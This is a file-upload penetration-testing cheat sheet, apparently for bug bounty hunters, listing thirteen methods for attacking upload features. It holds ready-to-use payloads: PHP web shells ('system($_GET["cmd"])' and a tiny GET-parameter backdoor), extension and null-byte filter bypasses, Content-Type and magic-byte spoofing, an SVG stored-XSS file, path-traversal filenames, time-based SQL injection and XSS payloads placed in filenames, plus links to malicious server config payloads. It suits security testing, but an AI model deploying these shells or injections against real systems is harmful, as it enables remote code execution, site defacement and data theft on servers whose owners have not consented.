@@ -1,0 +1,326 @@
+Method #1 to Test Upload Functionality
+
+If the site is using vulnerable ImageTragick package/software in the backend which is responsible for image manipulation (img resize, format change etc), then an attacker can achieve various critical vulnerabilities
+
+Such as SSRF (Server Side Request Forgery), RCE (Remote Code Execution), File Deletion, File Moving and Local File Read/Inclusion 
+
+Vulnerable Version: 7.0.1-0 / 6.9.3-9
+
+CVE:
+1. CVE-2016-3714 (RCE) 
+2. CVE-2016-3715 (File Deletion) 
+3. CVE-2016-3716 (File Moving) 
+4. CVE-2016-3717 (Local File Read) 
+5. CVE-2016-3718 (SSRF) 
+
+Reference Link:
+https://hackerone.com/reports/412021
+https://pastebin.com/aE4sKnCg
+
+---------------------------------------------------------------------------------------------------------------
+
+Method #2 to Test Upload Functionality (Blacklisting Bypass) 
+
+If upload functionality has blacklisted some extensions (such as php, asp, apsx are not allowed) then you just have to find that extensions which are yet valid extensions but are not blacklisted by upload functionality
+
+For e.g.
+Unpopular PHP extensions:
+.phtm, .phtml, .phps, .pht, .php2, .php3, .php4, .php5, .php6, .shtml, .phar, .pgif, .inc
+
+Unpopular ASP extensions:
+.asp, .aspx, .cer, .asa
+
+Unpopular JSP extensions:
+.jsp, .jspx, .jsw, .jsv, .jspf
+
+Coldfusion: .cfm, .cfml,  .cfc, .cbm
+
+Try to upload backdoor.php with these extensions in order to bypass blacklisting, 
+
+Using random Capitalization can also sometimes helps:
+.pHp, .pHP5, .aSp, etc
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #3 (Whitelisting Bypass) 
+
+Most of the time, you will encounter upload functions which only allow specific extensions file to upload (such as png & jpg) 
+
+Whitelisting Bypass methods:
+1. Using double extensions: Some servers such as apache allows file with double extensions, 
+
+If double extensions is enabled on server then, uploading shell.php.jpg may trick the server into accepting php file. 
+
+2. Null Byte Injection: Injecting null bytes in filename can bypass file extension restrictions
+
+e.g. shell.php%00.jpg
+OR
+shell.php\x00.jpg
+
+shell.php%00
+shell.php%20
+shell.php%0d%0a.jpg
+
+(Note: Windows will stop you from naming a file which contains these null bytes, so change name while intercepting request in burpSuite) 
+
+3. Some more characters for whitelisting bypass
+shell.php........ 
+shell.php.\
+shell.php/
+shell.
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #4 to Test Upload Functionality
+(Content-Type Validation Bypass) 
+
+In some cases, server checks the file type on the basis of Content-type header and then decides that whether it should be allowed to upload on server or not. 
+
+But Content-type header could easily be modified while upload a file to the server, 
+
+Intercepting the upload image request and then tampering the Content-type header could easily bypass this check, 
+
+Change these Content-type header 
+============================
+Content-type: application/x-php
+
+OR
+
+Content-type: application/octet-stream
+
+------
+To
+------
+Content-type: image/png
+
+OR
+
+Content-type: image/gif
+
+OR
+
+Content-type: image/jpg
+
+Reference Hackerone Report (Content-type Validation Bypass) 
+============================
+https://hackerone.com/reports/722919
+
+-----------------------------------------------------------------------------------------------------------
+
+=============================
+Method #5 to Test Upload Functionality
+(Content Check Bypass) 
+=============================
+
+If the upload option is checking the actual content of uploaded file, then adding "GIF89a;" Before the shell code with "Content-type: image/gif"
+
+Could help in content check bypass, if gif images are allowed. 
+
+Content example of shell.php
+========================
+GIF89a; <?php system($_GET["cmd"]); ?>
+
+------------------------------------------------------------------------------------------------------------------
+
+=============================
+Method #6 : (Content Length Validation Bypass) 
+=============================
+
+If upload option only accepts a particular size of image, then using a simple php shell with less functionality could help to achieve extremely less size payload
+
+Example backdoor.php
+===================
+(<?=$_GET[x]?>) 
+
+This php code will take a GET based parameter i.e. "x" And will execute the attacker input in backend shell
+
+After this backdoor.php gets uploaded successfully to the server, by enumerating the full path of backdoor.php, attacker could execute shell commands on hacked server
+
+e.g. https://vulnerable.com/uploads/backdoor.php?x=whoami
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #7 to Test Upload Functionality
+(SVG file upload to achieve Stored XSS) 
+
+If a upload option supports SVG file upload, or by some bypass, of you are able to upload SVG image file, then you can achieve stored XSS through it
+
+SVG stands for "Scalable Vector Graphics" Which is an XML-based vector image format for 2D graphics with support for interactivity and animation (Google it to learn more) 
+
+e.g. Malicious SVG file with XSS payload in it
+===========================
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("SVG to XSS : )");
+   </script>
+</svg>
+=============================
+
+Save this above content in .svg file, and then upload it
+
+You can observe from the intercepted upload request, that "Content-type: image/svg+xml" is set
+
+After successful upload, visit uploaded file path
+
+e.g. http://vulnerable.com/uploads/xss.svg
+
+This will trigger Stored XSS vulnerability
+
+Which is very well paid by the companies
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #8 to Test Upload Functionality
+(Directory Traversal through filename) 
+
+If the site is not performing proper checks on filename of uploaded file, then an attacker could easily achieve Directory Traversal by naming the uploaded file to "../../../logo.png"
+
+
+This can help an attacker to replace the original website logo or favicon, or in general, an attacker can replace any image on that vulnerable site thought directory Traversal
+
+Directory Traversal a.k.a Path Traversal is a high severity bug which is a subset vulnerability of File Inclusion bug
+
+There are lots of filters also which could bypass potential Directory Traversal filters. 
+
+For e.g. If a web developer has implemented a custom filter on uploaded filename, such as replacing "../" From the filename
+
+Then we can construct a bypass by using filename as :
+
+..././..././..././logo.png
+
+Server will replace the ".. /" From this  filename, 
+
+And the resultant filename which server will get is:
+
+../../logo.png    (Our desired malicious  filename 🙃)
+
+Thus when there is a filter, then there is a bypass
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #9 to Test Upload Functionality
+(Pixel Flood Attack Leading to Application level DOS Attack) 
+
+If the image upload option has no maximum pixel limit, and the uploaded image is also been processed in the backend, 
+
+Then if an attacker upload a large pixel image with let's say pixel of 64250*64250px (height and width)
+
+Then server will try to load  ‘whole image’ into memory thus allocating 4128062500 pixels into memory, flooding the memory and causing DoS (Denial Of Service) attack
+
+Note: Some companies mentions DOS attack as out of scope vulnerability, so test before reading there Terms and Guidelines
+
+Reference:
+=========
+https://hackerone.com/reports/390
+https://hackerone.com/reports/970760
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #10 to Test Upload Functionality
+(OOB SQL injection via Filename) 
+
+If the web developers are blindly trusting the filename and passing it directly to database, then
+
+It can allow an attacker to execute Out Of Band Sql injection 
+
+Let's say a site is asking for Job CV, and putting the CV filename in database, 
+
+Then by manipulating the filename (using malicious filename), we can inject malicious sql queries in database, thus performing OOB SQL injection
+
+Using filename such as :
+
+'sleep(10).jpg
+"sleep(10).jpg
+') sleep(10).jpg
+") sleep(10).jpg
+
+Or 
+'waitfor delay'0:0:10'--+.png
+
+Etc
+
+Can help an attacker to achieve Time Based SQL injection, 
+
+We can confirm this vulnerability by checking the response delay of 10 seconds, after uploading a file with malicious filename
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #11 to Test Upload Functionality
+(DOS attack through long filename) 
+
+If a site is using original filename and not renaming it, then it can sometime cause application level DOS attack, 
+
+An Ideal upload functionality, should rename the uploaded file, with random unguessable name, and directory listing should be disabled in the image_upload folder
+
+So that attacker can't guess the uploaded file path
+
+Vulnerability:
+===========
+If an attacker uploads a file with very long filename such as 1395858828339.........................2838484858483828388384838484.png
+
+Then it can sometime cause application level DOS attack
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #12 to Test Upload Functionality
+(XSS via image filename) 
+
+If the image filename is been reflected on page of vulnerable site, 
+
+Then using XSS payload in image filename can trigger XSS vulnerability, if proper sanitisation of filename is not in place
+
+Payload Examples
+================
+<script>alert(1)</script>.png
+'><script>alert(1)</script>.png
+"><script>alert(1)</script>.png
+<svg onload=alert(1)>.png
+'><svg onload=alert(1)>.png
+"><svg onload=alert(1)>.png
+
+Reference
+==========
+https://hackerone.com/reports/179695
+https://hackerone.com/reports/93807
+https://hackerone.com/reports/1010466
+
+Mitigation
+=========
+Ideally web application should rename the uploaded filename with random unguessable filename, 
+
+And it should not reflect the filename in web page
+
+------------------------------------------------------------------------------------------------------------------
+
+Method #13 to Test Upload Functionality
+(Abusing Upload Functionality by Uploading Config & Js files to Web Servers) 
+
+If the upload functionality is allowing you to upload config files such as (htaccess, web.config, httpd.conf, init.py) then, we can achieve RCE (Remote Code Execution) through it
+
+And if you are able to upload js files then, you can achieve stored XSS
+
+1. If the Server is PHP based & you are able to upload & overwrite the existence htaccess file to the server, then you can execute PHP code. 
+
+Or we can also, put the evil code in image file, with whitelisted extension (such as png, jpg) , 
+Then by uploading malicious htaccess file, we can make that whitelisted extension (such as png) executable thus we will able to execute hidden shellcode of malicious image. 
+
+ Malicious htaccess payload :
+
+(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) 
+
+2. If we have upload access to a non /cgi-bin folder - then we can upload a malicious httpd.conf and can configure our own interpreter to execute .sh (bash script) on the server
+
+ Malicious httpd.conf link (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf) 
+
+3. Uploading malicious web.config or web.web.config file to the IIS Server can leads to Remote code Execution
+
+ Malicious payload link: (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) 
+
+4. Uploading malicious _init_.py file to Python powered server can also leads to Remote code execution
+
+ Malicious Payload Link: (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
+------------------------------------------------------------------------------------------------------------------
